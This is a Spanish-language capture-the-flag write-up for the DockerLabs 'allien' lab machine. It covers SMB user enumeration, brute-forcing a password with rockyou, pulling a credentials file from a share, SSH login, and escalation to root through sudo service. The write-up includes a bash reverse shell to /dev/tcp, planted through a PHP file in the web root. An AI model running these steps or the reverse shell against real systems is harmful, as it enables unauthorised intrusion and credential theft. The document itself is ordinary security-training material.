nmap: 22,80,139,445

![[dockerlabs/facil/allien/nmap.png]]

---
hacemos un gobuster y nos da:

    gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,py,txt -t 64

![[dockerlabs/facil/allien/gobuster.png]]


    - info.php
    - productos.php

productos.php nos manda a otra pagina 

![[dockerlabs/facil/allien/pagina1.png]]

en esa hay posibles contraseñas o usuarios como "shopo" o el codigo SHOPO20

haciendo un:
> enum4linux 172.17.0.2

nos da usuarios que tienen:

     - usuario1
     - usuario1
     - usuario3
     - satriani7
     - administrador

![[users.png]]


hacemos una fuerza bruta: 

    sudo netexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding 

da:
> santriani7/50cent

![[satriani.png]]

lo utilizamos para ver que ficheros tiene:

    smbmap -u 'satriani7' -p '50cent' -H 172.17.0.2

da:

    - myshare
    - backup24

![[dockerlabs/facil/allien/back.png]]

nos conectamos ahora al "smb" 

    smbclient //172.17.0.2/backup24 -U 'satriani7%50cent'

dentro hay varios documentos
seguimos esta ruta: 
> Documentos > personal > get credentials.txt

![[document.png]]

en nuestra terminal lo leemos y tiene los usuarios y contraseñas

![[credencial.png]]

entramos por el ssh con la de administrador

     administrador/Adm1nP4ss2024

![[dockerlabs/facil/allien/conexion.png]]

hacemos el comando: find / -user administrador 2>/dev/null
y encontramos esto

![[var.png]]

Sabiendo esto, podemos intentar crear un archivo que nos permita pasar al usuario "www-data"

vamos a la siguiente dirección:
> cd /var/www/html

creamos primero una carpeta llamada: shell.sh

    - #!/bin/bash
    - bash -i >& /dev/tcp/172.17.0.1/443 0>&1

ahora creamos una carpeta con php

      - <?php
      - system('./shell.sh')
      - ?>

ahora vamos al navegador que esten utilizando, en este caso firefox y colocamos: 
    http://172.17.0.2/shell.php
en el terminal victima colocamos en escucha: nc -nlvp 443 

![[dockerlabs/facil/allien/conexion2.png]]

y estamos otra vez dentro

ahora un tratamiento stty

colocamos sudo -l
podemos escalar por "service". lo buscamos: https://gtfobins.github.io/gtfobins/service/#sudo

![[dockerlabs/facil/allien/sudo.png]]

lanzamos el comando que nos da: 

    sudo service ../../bin/sh

bash -p

![[dockerlabs/facil/allien/root.png]]

y somos root! 
